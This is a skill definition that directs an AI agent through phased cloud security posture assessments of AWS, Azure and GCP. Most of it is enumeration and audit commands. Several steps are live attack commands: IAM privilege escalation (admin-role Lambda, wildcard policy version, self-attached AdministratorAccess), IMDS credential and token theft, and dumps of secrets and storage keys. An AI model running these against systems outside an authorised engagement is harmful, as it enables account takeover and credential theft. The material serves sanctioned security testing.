---
name: cloud-security
description: |
  Cloud security posture assessment for AWS, Azure, and GCP. Tests IAM privilege escalation paths, public storage exposure, serverless attack surface, database exposure, logging gaps, container registry security, and cloud-specific attacks.

  Both authenticated (with cloud credentials) and unauthenticated (external) modes. Uses nuclei cloud templates, Prowler, ScoutSuite, manual IMDS/metadata probing, and deep AWS/Azure/GCP CLI enumeration.

  Produces: cloud architecture diagram, attack path map, findings per category, compliance mapping (SOC 2, PCI DSS 4.0, HIPAA, CIS), PoCs for confirmed exploits. Chains into /gh-export for issue filing.
argument-hint: <cloud-target> [provider=aws|azure|gcp] [mode=authenticated|external] [depth=quick|standard|thorough]
user-invocable: true
---

# Cloud Security Posture Assessment

You are an expert cloud security engineer performing a comprehensive assessment of cloud infrastructure. Your goal: identify IAM misconfigurations, exposed resources, privilege escalation paths, serverless attack surface, database exposure, logging gaps, and compliance violations — then map realistic attack chains from external attacker to sensitive data.

**Request:** $ARGUMENTS

---

## CHAIN COMMITMENTS — DECLARE BEFORE STARTING

Read this before executing any workflow phase. Commit to MANDATORY chains before your first tool call.

| Trigger | Chain | Mandatory? | Claude Code |
|------|------|------|------|
| After `Write("pentest/summary.md", "<summary>")` | `/gh-export` | **MANDATORY** | `Skill(skill="gh-export")` |
| Cloud credentials → instance/compute access obtained | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` |
| Architecture review needed | `/threat-modeling` | OPTIONAL | `Skill(skill="threat-modeling")` |
| K8s workloads found | `/container-k8s-security` | OPTIONAL | `Skill(skill="container-k8s-security")` |

**You WILL invoke `/gh-export` after `Write("pentest/summary.md", "<summary>")`. This is not optional.**

## Tools Available

| Tool | Use for |
|------|---------|
| `Bash("<cmd>")` | Any Kali tool — nmap, naabu, httpx, nuclei, ffuf, katana, subfinder, semgrep, trufflehog, sqlmap, nikto, hydra, gobuster, testssl, enum4linux-ng, theHarvester, dnsrecon, certipy, nxc, impacket, searchsploit, … (everything is on PATH on Kali). Also `curl` for raw HTTP probes. |
| `Write("pocs/<name>.http", ...)` | Save a confirmed exploit as a raw `.http` file under `pocs/` (paste-ready for Burp Repeater). |
| `Write("pentest/diagrams/<name>.mmd", ...)` | Save a Mermaid architecture/network diagram. |
| `Bash("jq -nc ... >> pentest/events.jsonl")` | Append events: notes, skill chains, cell updates, findings. Schema and canonical one-liners in [pentester/EVENTS.md](pentester/EVENTS.md). All state changes go through `events.jsonl`. |
| `Bash("python3 ~/.claude/skills/pentester/refresh.py")` + `Read("pentest/findings.json")` / `Read("pentest/coverage.json")` | Refresh the derived snapshots, then read them. Used by recovery and by the `/gh-export` and `/remediate` chains. |
| `Bash("tmux new-session ...")` + `tmux send-keys` / `tmux capture-pane` | Drive interactive tools that need a live PTY — msfconsole, evil-winrm, responder, listeners. |


**Logging:** Before invoking any skill above, append a `skill_chain` event to `pentest/events.jsonl` (see CLAUDE.md "Skill logging" for the exact one-liner).

---

## ATT&CK Coverage

| Technique | ID | What we test |
|-----------|----|-------------|
| Cloud Account Discovery | T1526 | Enumerate cloud resources and permissions |
| Valid Accounts: Cloud | T1078.004 | Overly permissive IAM policies, privilege escalation |
| Cloud Service Discovery | T1580 | Serverless, database, container, storage enumeration |
| Exploit Public-Facing App | T1190 | IMDS exploitation, exposed management consoles |
| Disable Cloud Logs | T1562.008 | CloudTrail/Azure Monitor/GCP Audit logging gaps |
| Unsecured Credentials | T1552 | IAM keys in metadata, secrets in env vars, SSM parameters |
| Steal Application Access Token | T1528 | IMDS token theft, service account key extraction |
| Account Manipulation | T1098 | IAM policy attachment, role trust modification |

---

## Depth Presets

| Depth | What runs | Default limits |
|-------|-----------|----------------|
| `quick` | Public bucket/blob scan + IMDS probe + nuclei cloud templates | $0.10 · 15 min · 10 calls |
| `standard` | Quick + IAM privilege escalation + security groups + storage deep-dive | $0.50 · 45 min · 25 calls |
| `thorough` | Standard + Prowler/ScoutSuite + serverless + databases + logging + container registry + attack paths + compliance | $2.00 · 120 min · 60 calls |

---

## Workflow

### Before running any tool

If the request does not specify the cloud provider or mode, ask the user:

> **Target:** `<cloud target>`  **Provider:** `<aws/azure/gcp>`  **Mode:** `<authenticated / external>`
>
> **Which assessment depth?**
> - `quick` — public exposure + IMDS + nuclei *($0.10 · 15 min)*
> - `standard` — quick + IAM escalation + storage deep-dive *($0.50 · 45 min)*
> - `thorough` — full assessment + compliance mapping *($2.00 · 120 min)*
>
> Do you have cloud credentials (access keys, service principal, service account)?

---

### Phase 0 — Scope & Setup

0. Call `Bash("mkdir -p pentest/{pocs,diagrams} && touch pentest/events.jsonl") + Write("pentest/scope.json", {...})` with target, depth, and limits
1. Call `# (no dashboard — see pentest/findings.json directly)` — live findings tracker
2. Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg msg '<message>' '{ts:$ts,type:\"note\",msg:$msg}' >> pentest/events.jsonl")` — record cloud provider, mode, available credentials, target scope

---

### Phase 1 — External Reconnaissance (no credentials needed)

**Public storage exposure** — run in parallel:
```
Bash("curl -s https://BUCKET.s3.amazonaws.com/ | head -100")                                  # AWS S3
Bash("curl -s 'https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list'")  # Azure Blob
Bash("curl -s 'https://storage.googleapis.com/BUCKET'")                                        # GCP GCS
```

**Nuclei cloud templates:**
```
Bash("nuclei https://TARGET ...")
```

**IMDS probing** (via SSRF or instance access):
```
Bash("curl ...")
Bash("curl ...")
Bash("curl ...")
Bash("curl ...")
```

---

### Phase 2 — IAM Privilege Escalation Analysis (authenticated, standard+)

#### AWS IAM Enumeration

```
Bash("aws iam get-account-summary")
Bash("aws iam get-account-authorization-details --output json > /tmp/iam.json && python3 -c 'import json; d=json.load(open(\"/tmp/iam.json\")); [print(f\"User: {u[\"UserName\"]}, Policies: {[p[\"PolicyName\"] for p in u.get(\"AttachedManagedPolicies\",[])]}\") for u in d.get(\"UserDetailList\",[])]'")
```

#### AWS IAM Privilege Escalation Paths

Test each vector. For every path that exists, call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg id 'f-001' --arg title '<title>' --arg sev 'high' --argjson leads '[{\"lead\":\"<x>\",\"status\":\"pending\"}]' '{ts:$ts,type:\"finding\",action:\"add\",id:$id,title:$title,severity:$sev,escalation_leads:$leads}' >> pentest/events.jsonl")`.

**iam:PassRole + Lambda (create function with privileged role):**
```
Bash("aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service==`lambda.amazonaws.com`]].{Name:RoleName,Arn:Arn}' --output table")
Bash("aws lambda create-function --function-name escalation-test --runtime python3.12 --role arn:aws:iam::ACCOUNT:role/ADMIN_ROLE --handler index.handler --zip-file fileb://payload.zip")
```

**iam:PassRole + EC2 (launch instance with privileged instance profile):**
```
Bash("aws iam list-instance-profiles --query 'InstanceProfiles[].{Name:InstanceProfileName,Roles:Roles[].RoleName}' --output table")
Bash("aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t3.micro --iam-instance-profile Name=ADMIN_PROFILE --user-data '#!/bin/bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE > /tmp/creds'")
```

**iam:PassRole + Glue (create job with privileged role):**
```
Bash("aws glue create-job --name escalation-test --role arn:aws:iam::ACCOUNT:role/ADMIN_ROLE --command '{\"Name\":\"pythonshell\",\"ScriptLocation\":\"s3://bucket/script.py\"}'")
```

**iam:CreatePolicyVersion (overwrite existing policy with admin):**
```
Bash("aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}' --set-as-default")
```

**iam:AttachUserPolicy / iam:PutUserPolicy (self-escalation):**
```
Bash("aws iam attach-user-policy --user-name CURRENT_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess")
Bash("aws iam put-user-policy --user-name CURRENT_USER --policy-name admin --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'")
```

**sts:AssumeRole chains + cross-account trust abuse:**
```
Bash("aws iam list-roles --output json | python3 -c 'import json,sys; roles=json.load(sys.stdin)[\"Roles\"]; [print(f\"DANGEROUS: {r[\"RoleName\"]} trusts {s.get(\"Principal\",{})}\") for r in roles for s in r[\"AssumeRolePolicyDocument\"][\"Statement\"] if s.get(\"Effect\")==\"Allow\" and (\"*\" in str(s.get(\"Principal\",{})) or \":root\" in str(s.get(\"Principal\",{})))]'")
Bash("aws sts assume-role --role-arn arn:aws:iam::TARGET_ACCOUNT:role/ROLE --role-session-name audit-test")
```

**Service-linked role abuse:**
```
Bash("aws iam list-roles --query 'Roles[?Path==`/aws-service-role/`].{Name:RoleName,Service:AssumeRolePolicyDocument.Statement[0].Principal.Service}' --output table")
```

**Enumerate all permissions first** — escalation paths depend on what the current principal can do. AWS adds new services and actions regularly, so always check dynamically:
```
Bash("aws iam list-attached-user-policies --user-name CURRENT_USER --output table")
Bash("aws iam list-user-policies --user-name CURRENT_USER --output table")
Bash("aws iam get-user-policy --user-name CURRENT_USER --policy-name POLICY --output json")
```

**Common escalation patterns** (examples — not exhaustive; new AWS services create new paths):

| Path | Severity | Vector |
|------|----------|--------|
| `iam:PassRole` + `lambda:CreateFunction` | **Critical** | Create Lambda with admin role, invoke it |
| `iam:PassRole` + `ec2:RunInstances` | **Critical** | Launch EC2 with admin instance profile |
| `iam:PassRole` + `glue:CreateJob` | **Critical** | Create Glue job with admin role |
| `iam:CreatePolicyVersion` | **Critical** | Overwrite customer-managed policy with `*:*` |
| `iam:AttachUserPolicy` / `PutUserPolicy` | **Critical** | Attach/inline admin policy on self |
| `iam:AttachRolePolicy` | **Critical** | Attach AdministratorAccess to assumable role |
| `sts:AssumeRole` to admin role | **Critical** | Assume a role with elevated permissions |
| Cross-account trust with `:root` | **High** | Any principal in trusted account can assume |
| `iam:CreateAccessKey` | **High** | Create API keys for any user |
| `iam:UpdateLoginProfile` | **High** | Reset any user's console password |

For systematic coverage, also run Prowler or ScoutSuite (Phase 10) — they check hundreds of escalation vectors automatically.

#### Azure IAM
```
Bash("az role assignment list --all --query \"[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor'].{Principal:principalName,Role:roleDefinitionName,Scope:scope}\" --output table")
Bash("az ad sp list --all --output table | head -30")
```

#### GCP IAM
```
Bash("gcloud projects get-iam-policy PROJECT_ID --flatten='bindings[].members' --format='table(bindings.role,bindings.members)' --filter='bindings.role:roles/owner OR bindings.role:roles/editor'")
Bash("gcloud iam service-accounts list --format table")
```

---

### Phase 3 — Storage Bucket Deep-Dive (authenticated, standard+)

**Bucket policy + ACL analysis (public ACL vs bucket policy interaction):**
```
Bash("for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do echo \"=== $b ===\"; aws s3api get-public-access-block --bucket $b 2>/dev/null || echo 'NO PUBLIC ACCESS BLOCK'; echo '--- ACL ---'; aws s3api get-bucket-acl --bucket $b 2>/dev/null; echo '--- Policy ---'; aws s3api get-bucket-policy --bucket $b 2>/dev/null || echo 'No policy'; done")
```

**Versioning state (recover deleted objects):**
```
Bash("for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do echo \"=== $b ===\"; aws s3api get-bucket-versioning --bucket $b; done")
Bash("aws s3api list-object-versions --bucket BUCKET --query 'DeleteMarkers[].{Key:Key,VersionId:VersionId}' --output table | head -20")
Bash("aws s3api get-object --bucket BUCKET --key DELETED_FILE --version-id VERSION_ID /tmp/recovered")
```

**Encryption validation (SSE-S3 vs SSE-KMS vs SSE-C):**
```
Bash("for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do echo \"=== $b ===\"; aws s3api get-bucket-encryption --bucket $b 2>/dev/null || echo 'NO ENCRYPTION'; done")
Bash("aws s3api head-object --bucket BUCKET --key KEY --query '{Encryption:ServerSideEncryption,KMSKeyId:SSEKMSKeyId}'")
```

**Lifecycle policy + access logging:**
```
Bash("for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do echo \"=== $b ===\"; aws s3api get-bucket-lifecycle-configuration --bucket $b 2>/dev/null || echo 'No lifecycle'; aws s3api get-bucket-logging --bucket $b 2>/dev/null; done")
```

**Cross-account access via bucket policy + object-level ACL enumeration:**
```
Bash("for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do P=$(aws s3api get-bucket-policy --bucket $b --output text 2>/dev/null); if echo \"$P\" | grep -q 'Principal'; then echo \"=== $b cross-account ===\"; echo \"$P\"; fi; done")
Bash("aws s3api list-objects-v2 --bucket BUCKET --max-items 10 --query 'Contents[].Key' --output text | tr '\t' '\n' | while read k; do echo \"=== $k ===\"; aws s3api get-object-acl --bucket BUCKET --key \"$k\"; done")
```

**Pre-signed URL abuse:**
```
Bash("aws s3 presign s3://BUCKET/sensitive-file.txt --expires-in 604800")
```

**Azure Storage / GCP GCS:**
```
Bash("az storage account list --query '[].{Name:name,HTTPS:enableHttpsTrafficOnly,PublicAccess:allowBlobPublicAccess}' --output table")
Bash("az storage account keys list --account-name ACCOUNT --output table")
Bash("gsutil iam get gs://BUCKET && gsutil acl get gs://BUCKET && gsutil versioning get gs://BUCKET")
```

---

### Phase 4 — Network Security (authenticated, standard+)

```
Bash("aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].[GroupId,GroupName,IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]].[FromPort,ToPort]]' --output table")
Bash("az network nsg list --output table && az network nsg rule list --nsg-name NSG --resource-group RG --query '[?sourceAddressPrefix==`*`].{Name:name,Port:destinationPortRange,Access:access}' --output table")
```

| Rule | Severity |
|------|----------|
| 0.0.0.0/0 on 22/3389 | **High** — SSH/RDP open to internet |
| 0.0.0.0/0 on 445/3306/5432 | **Critical** — SMB/database ports open |
| 0.0.0.0/0 on all ports | **Critical** — fully open |

---

### Phase 5 — Serverless Attack Surface (authenticated, thorough)

**Lambda environment variable extraction + layer inspection:**
```
Bash("for fn in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do echo \"=== $fn ===\"; aws lambda get-function-configuration --function-name $fn --query '{Runtime:Runtime,Role:Role,Env:Environment.Variables,Timeout:Timeout}'; done")
Bash("aws lambda list-layers --query 'Layers[].{Name:LayerName,Arn:LatestMatchingVersion.LayerVersionArn}' --output table")
Bash("aws lambda get-layer-version --layer-name LAYER --version-number 1 --query 'Content.Location' --output text | xargs curl -s -o /tmp/layer.zip && unzip -l /tmp/layer.zip")
```

**Function resource policy (who can invoke) + event source injection:**
```
Bash("for fn in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do echo \"=== $fn ===\"; aws lambda get-policy --function-name $fn 2>/dev/null || echo 'No policy'; done")
Bash("aws lambda list-event-source-mappings --query 'EventSourceMappings[].{Function:FunctionArn,Source:EventSourceArn,State:State}' --output table")
```

**API Gateway auth bypass:**
```
Bash("aws apigateway get-rest-apis --query 'items[].{Name:name,Id:id}' --output table")
Bash("aws apigateway get-resources --rest-api-id API_ID --query 'items[].{Path:path,Methods:resourceMethods}' --output table")
Bash("aws apigateway get-method --rest-api-id API_ID --resource-id RES_ID --http-method GET --query '{Auth:authorizationType,ApiKey:apiKeyRequired}'")
```

**Step Functions state injection:**
```
Bash("aws stepfunctions list-state-machines --query 'stateMachines[].{Name:name,Arn:stateMachineArn}' --output table")
Bash("aws stepfunctions describe-state-machine --state-machine-arn ARN --query '{Definition:definition,Role:roleArn}'")
```

**Azure Functions / GCP Cloud Functions:**
```
Bash("az functionapp config appsettings list --name APP --resource-group RG --output table")
Bash("for fn in $(gcloud functions list --format='value(name)'); do echo \"=== $fn ===\"; gcloud functions describe $fn --format='json(environmentVariables,serviceAccountEmail)'; done")
```

---

### Phase 6 — Database Exposure Matrix (authenticated, thorough)

**RDS (public accessibility, snapshot sharing):**
```
Bash("aws rds describe-db-instances --query 'DBInstances[].{ID:DBInstanceIdentifier,Engine:Engine,Public:PubliclyAccessible,Encrypted:StorageEncrypted,Endpoint:Endpoint.Address}' --output table")
Bash("aws rds describe-db-snapshot-attributes --db-snapshot-identifier SNAP_ID --query 'DBSnapshotAttributesResult.DBSnapshotAttributes[?AttributeName==`restore`].AttributeValues'")
```

**DynamoDB (streams, cross-account) + ElastiCache (AUTH, encryption):**
```
Bash("for t in $(aws dynamodb list-tables --query 'TableNames[]' --output text); do echo \"=== $t ===\"; aws dynamodb describe-table --table-name $t --query 'Table.{Stream:StreamSpecification,SSE:SSEDescription}'; done")
Bash("aws elasticache describe-cache-clusters --query 'CacheClusters[].{ID:CacheClusterId,Engine:Engine,Auth:AuthTokenEnabled,TransitTLS:TransitEncryptionEnabled,AtRest:AtRestEncryptionEnabled}' --output table")
```

**DocumentDB (TLS) + OpenSearch (open access, fine-grained access):**
```
Bash("aws docdb describe-db-cluster-parameters --db-cluster-parameter-group-name default.docdb5.0 --query 'Parameters[?ParameterName==`tls`].{Name:ParameterName,Value:ParameterValue}' --output table")
Bash("aws opensearch describe-domain --domain-name DOMAIN --query 'DomainStatus.{Endpoint:Endpoint,Encryption:EncryptionAtRestOptions,FineGrained:AdvancedSecurityOptions,AccessPolicies:AccessPolicies}'")
```

**Azure / GCP databases:**
```
Bash("az sql server firewall-rule list --server SERVER --resource-group RG --query '[?startIpAddress==`0.0.0.0`].{Name:name,Start:startIpAddress,End:endIpAddress}' --output table")
Bash("gcloud sql instances list --format='table(name,databaseVersion,settings.ipConfiguration.authorizedNetworks,settings.ipConfiguration.ipv4Enabled)'")
```

---

### Phase 7 — Logging and Monitoring Validation (authenticated, thorough)

**CloudTrail (multi-region, data events, log validation, tampering detection):**
```
Bash("aws cloudtrail describe-trails --query 'trailList[].{Name:Name,MultiRegion:IsMultiRegionTrail,S3Bucket:S3BucketName,LogValidation:LogFileValidationEnabled,KMS:KmsKeyId}' --output table")
Bash("aws cloudtrail get-trail-status --name TRAIL --query '{IsLogging:IsLogging,LatestDelivery:LatestDeliveryTime}'")
Bash("aws cloudtrail get-event-selectors --trail-name TRAIL --query '{EventSelectors:EventSelectors,Advanced:AdvancedEventSelectors}'")
```

**VPC Flow Logs (find VPCs without flow logs):**
```
Bash("aws ec2 describe-vpcs --query 'Vpcs[].VpcId' --output text | tr '\t' '\n' | while read vpc; do FLOWS=$(aws ec2 describe-flow-logs --filter Name=resource-id,Values=$vpc --query 'FlowLogs[].FlowLogId' --output text); if [ -z \"$FLOWS\" ]; then echo \"NO FLOW LOGS: $vpc\"; fi; done")
```

**GuardDuty + Security Hub + Config:**
```
Bash("aws guardduty list-detectors --output table && aws guardduty get-detector --detector-id DETECTOR_ID --query '{Status:Status,DataSources:DataSources}' 2>/dev/null")
Bash("aws securityhub describe-hub 2>/dev/null || echo 'Security Hub NOT ENABLED'")
Bash("aws configservice describe-configuration-recorders --query 'ConfigurationRecorders[].{Name:name,AllSupported:recordingGroup.allSupported}' --output table")
```

**Azure / GCP logging:**
```
Bash("az security assessment list --query '[?status.code!=`Healthy`].{Name:displayName,Status:status.code,Severity:metadata.severity}' --output table | head -30")
Bash("gcloud logging sinks list --format='table(name,destination,filter)'")
Bash("gcloud projects get-iam-policy PROJECT --format=json | python3 -c 'import json,sys; [print(f\"Service: {c[\"service\"]}, Types: {[l[\"logType\"] for l in c.get(\"auditLogConfigs\",[])]}\") for c in json.load(sys.stdin).get(\"auditConfigs\",[])]'")
```

---

### Phase 8 — Container Registry Security (authenticated, thorough)

**ECR (scanning, cross-account, immutability, lifecycle):**
```
Bash("aws ecr describe-repositories --query 'repositories[].{Name:repositoryName,ScanOnPush:imageScanningConfiguration.scanOnPush,Immutable:imageTagMutability}' --output table")
Bash("for repo in $(aws ecr describe-repositories --query 'repositories[].repositoryName' --output text); do echo \"=== $repo ===\"; aws ecr get-repository-policy --repository-name $repo 2>/dev/null || echo 'No policy'; aws ecr get-lifecycle-policy --repository-name $repo 2>/dev/null || echo 'No lifecycle'; done")
Bash("aws ecr describe-image-scan-findings --repository-name REPO --image-id imageTag=latest --query 'imageScanFindings.findingSeverityCounts' 2>/dev/null")
```

**Azure ACR / GCP Artifact Registry:**
```
Bash("az acr list --query '[].{Name:name,AdminEnabled:adminUserEnabled,PublicAccess:publicNetworkAccess}' --output table")
Bash("gcloud artifacts repositories list --format='table(name,format,mode)'")
```

---

### Phase 9 — Cloud-Specific Attacks (thorough)

#### AWS-Specific

**Resource-based policy confusion (S3, SQS, SNS, Lambda) — wildcard principal abuse:**
```
Bash("for q in $(aws sqs list-queues --query 'QueueUrls[]' --output text); do echo \"=== $q ===\"; aws sqs get-queue-attributes --queue-url $q --attribute-names Policy --query 'Attributes.Policy'; done")
Bash("for t in $(aws sns list-topics --query 'Topics[].TopicArn' --output text); do echo \"=== $t ===\"; aws sns get-topic-attributes --topic-arn $t --query 'Attributes.Policy'; done")
```

**SSM Parameter Store + Secrets Manager enumeration:**
```
Bash("aws ssm get-parameters-by-path --path '/' --recursive --with-decryption --query 'Parameters[?Type==`String`].{Name:Name,Value:Value}' --output table | head -20")
Bash("aws secretsmanager list-secrets --query 'SecretList[].{Name:Name,RotationEnabled:RotationEnabled}' --output table")
Bash("aws secretsmanager get-secret-value --secret-id SECRET --query '{Name:Name,Value:SecretString}' 2>/dev/null")
```

**Cross-region replication (data exfil paths):**
```
Bash("aws s3api get-bucket-replication --bucket BUCKET 2>/dev/null")
Bash("aws rds describe-db-instances --query 'DBInstances[?ReadReplicaDBInstanceIdentifiers].{ID:DBInstanceIdentifier,Replicas:ReadReplicaDBInstanceIdentifiers}' --output table")
```

#### Azure-Specific

**Managed identity abuse (IMDS to token to resource access):**
```
Bash("curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' | python3 -m json.tool")
```

**Azure AD App registrations (client secrets, excessive API permissions):**
```
Bash("az ad app list --query '[].{AppId:appId,Name:displayName,Creds:passwordCredentials[].{Hint:hint,Expiry:endDateTime}}' --output json | python3 -c 'import json,sys; [print(f\"App: {a[\"Name\"]}, Creds: {len(a.get(\"Creds\") or [])}\") for a in json.load(sys.stdin) if a.get(\"Creds\")]'")
Bash("az ad app permission list --id APP_ID --output table")
```

**Storage account keys + Key Vault access policy audit:**
```
Bash("for acct in $(az storage account list --query '[].name' --output tsv); do echo \"=== $acct ===\"; az storage account keys list --account-name $acct --query '[].{Key:keyName,Perms:permissions}' --output table; done")
Bash("az keyvault list --query '[].{Name:name,SoftDelete:enableSoftDelete,PurgeProtection:enablePurgeProtection}' --output table")
Bash("az keyvault show --name VAULT --query 'properties.accessPolicies[].{ObjectId:objectId,Secrets:permissions.secrets,Keys:permissions.keys}'")
```

#### GCP-Specific

**Service account key management (user-managed vs Google-managed):**
```
Bash("for sa in $(gcloud iam service-accounts list --format='value(email)'); do echo \"=== $sa ===\"; gcloud iam service-accounts keys list --iam-account $sa --format='table(name.basename(),keyType,validBeforeTime)'; done")
```

**Default service account abuse + cross-project IAM binding:**
```
Bash("gcloud compute instances list --format='table(name,serviceAccounts[].email,serviceAccounts[].scopes[])'")
Bash("gcloud projects get-iam-policy PROJECT --flatten='bindings[].members' --format='table(bindings.role,bindings.members)' --filter='bindings.members:*@*.iam.gserviceaccount.com AND NOT bindings.members:*@PROJECT.iam.gserviceaccount.com'")
```

**Pub/Sub topic access (cross-project, public):**
```
Bash("gcloud pubsub topics list --format='table(name)' && gcloud pubsub topics get-iam-policy TOPIC --format=json")
```

---

### Phase 10 — Automated Scanning (thorough)

```
Bash("prowler aws --severity critical high -M csv --output-directory /tmp/prowler 2>&1 | tail -50")
Bash("scout aws --no-browser --report-dir /tmp/scoutsuite 2>&1 | tail -50")
```

---

### Phase 11 — Attack Path Analysis (thorough)

Map realistic attack chains: 1) public bucket → creds → IAM escalation → data, 2) SSRF → IMDS → role creds → S3, 3) EC2 instance profile → cross-service, 4) iam:PassRole → Lambda → admin, 5) S3 trigger → Lambda env var secrets → database, 6) cross-account trust → sts:AssumeRole → target admin, 7) public snapshot → restore in attacker account → data, 8) ECR cross-account pull → malicious image.

```mermaid
flowchart TD
    Attacker["External Attacker"] --> S3["Public S3 Bucket"]
    S3 --> Creds["AWS Keys in Config"]
    Creds --> IAM["IAM User Access"]
    IAM --> PassRole["iam:PassRole"]
    PassRole --> Lambda["Lambda with Admin Role"]
    Lambda --> EnvVars["Env Var Secrets"]
    Lambda --> Admin["Full Account Access"]
    Attacker --> SSRF["SSRF in Web App"]
    SSRF --> IMDS["IMDS Metadata"]
    IMDS --> RoleCreds["Instance Role Credentials"]
    RoleCreds --> Data["S3 Data Access"]
    IAM --> AssumeRole["sts:AssumeRole"]
    AssumeRole --> CrossAcct["Cross-Account Admin"]
```

---

### Phase 12 — Cloud Compliance Mapping (thorough)

Map every confirmed finding to applicable compliance frameworks. Include in `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg id 'f-001' --arg title '<title>' --arg sev 'high' --argjson leads '[{\"lead\":\"<x>\",\"status\":\"pending\"}]' '{ts:$ts,type:\"finding\",action:\"add\",id:$id,title:$title,severity:$sev,escalation_leads:$leads}' >> pentest/events.jsonl")` description.

| Finding type | SOC 2 TSC | PCI DSS 4.0 | HIPAA | CIS (AWS/Azure/GCP) |
|-------------|-----------|-------------|-------|---------------------|
| Public S3/storage | CC6.1, CC6.6 | 1.3.1, 7.2.1 | 164.312(e)(1) | 2.1.1 / 3.5 / 5.1 |
| No CloudTrail/logging | CC7.1, CC7.2 | 10.2.1 | 164.312(b) | 3.1 / 5.1.1 / 2.1 |
| No MFA | CC6.1, CC6.3 | 8.4.2 | 164.312(d) | 1.5 / 1.1 / 1.1 |
| Wildcard IAM / escalation | CC6.1, CC6.2 | 7.2.1 | 164.312(a)(1) | 1.16 / 1.21 / 1.4 |
| No encryption at rest | CC6.7 | 3.5.1 | 164.312(a)(2)(iv) | 2.1.2 / 3.2 / 5.2 |
| No encryption in transit | CC6.7 | 4.2.1 | 164.312(e)(1) | 2.1.2 / 3.1 / 5.2 |
| No VPC Flow Logs | CC7.1 | 10.2.1 | 164.312(b) | 3.9 / 5.1.5 / 2.9 |
| Open security groups | CC6.6 | 1.3.1 | 164.312(e)(1) | 5.2 / 6.1 / 3.6 |
| No GuardDuty/threat detection | CC7.2, CC7.3 | 10.6.1 | 164.308(a)(1) | 4.1 / 2.6 / 2.12 |
| Public database | CC6.6 | 2.2.7 | 164.312(a)(1) | 2.3.2 / 4.3.1 / 6.2 |
| No backup/versioning | CC7.5 | 9.5.1 | 164.308(a)(7) | 2.1.3 / 3.8 / 5.1 |
| Secrets in env vars | CC6.1 | 8.6.1 | 164.312(a)(2)(iv) | 2.1.4 / 3.12 / 1.15 |

---

### Phase 13 — Report & Wrap-Up

1. Call `Write("pentest/diagrams/<title>.mmd", "<mermaid>")` with cloud architecture annotated with findings

2. Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg msg '<message>' '{ts:$ts,type:\"note\",msg:$msg}' >> pentest/events.jsonl")` with cloud security summary:
```
Cloud Security Assessment Summary:
  Provider:              [AWS/Azure/GCP]
  Mode:                  [authenticated/external]
  IAM issues:            [count] — escalation paths: [count]
  Public storage:        [count] buckets/blobs exposed
  Network exposure:      [count] open security groups/NSGs
  Serverless issues:     [count] functions with secrets in env vars
  Database exposure:     [count] publicly accessible databases
  Logging gaps:          [list]
  Attack paths:          [count] identified
  Compliance gaps:       SOC 2: [count] | PCI: [count] | HIPAA: [count] | CIS: [count]
```

3. Call `Write("pentest/summary.md", "<summary>")` with summary
4. **Export GitHub Issues** — invoke the `/gh-export` skill

---

## Chaining Other Skills

| Skill | When to invoke |
|-------|----------------|
| `/pentester` | Cloud-hosted web applications discovered |
| `/ai-redteam` | AI/LLM endpoints discovered (SageMaker, Bedrock, Azure OpenAI) |
| `/container-k8s-security` | EKS/AKS/GKE clusters discovered |
| `/analyze-cve` | CVE-affected cloud service version found |
| `/threat-modeling` | After assessment — STRIDE analysis of cloud architecture |
| `/gh-export` | Always — after `Write("pentest/summary.md", "<summary>")` |

---

## Finding Severity Guide

| Severity | Criteria | Examples |
|----------|----------|---------|
| **Critical** | Direct data access, full account compromise, privilege escalation to admin | Public S3 with PII; iam:PassRole → Lambda admin; public RDS snapshot; wildcard principal in role trust |
| **High** | Significant exposure, partial escalation, missing critical controls | Open SG on DB ports; no CloudTrail; no MFA for root; secrets in Lambda env vars; ElastiCache no AUTH |
| **Medium** | Config weakness, limited exposure, defense-in-depth gaps | No encryption at rest; old access keys; no VPC Flow Logs; no ECR lifecycle policy |
| **Low** | Best practice deviation, minimal direct risk | Default VPC; unused IAM users; no S3 access logging on non-sensitive bucket |

---

## Rules

- **`Bash("mkdir -p pentest/{pocs,diagrams} && touch pentest/events.jsonl") + Write("pentest/scope.json", {...})` is mandatory** — never run any other tool before it
- **Batch independent tools in the same response** — they execute in parallel
- When any tool returns a LIMIT message, stop immediately and call `Write("pentest/summary.md", "<summary>")`
- **Stay within declared scope** — only test cloud resources the user authorizes
- **Handle credentials carefully** — never log cloud access keys in findings; reference by key ID only
- **Call `Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg id 'f-001' --arg title '<title>' --arg sev 'high' --argjson leads '[{\"lead\":\"<x>\",\"status\":\"pending\"}]' '{ts:$ts,type:\"finding\",action:\"add\",id:$id,title:$title,severity:$sev,escalation_leads:$leads}' >> pentest/events.jsonl")` for every confirmed misconfiguration** — include resource ARN/ID, misconfiguration, risk, and compliance mapping
- **Map attack paths** — individual misconfigs are less impactful than chained paths to sensitive data
- **Check every escalation vector** — use the IAM privilege escalation matrix systematically
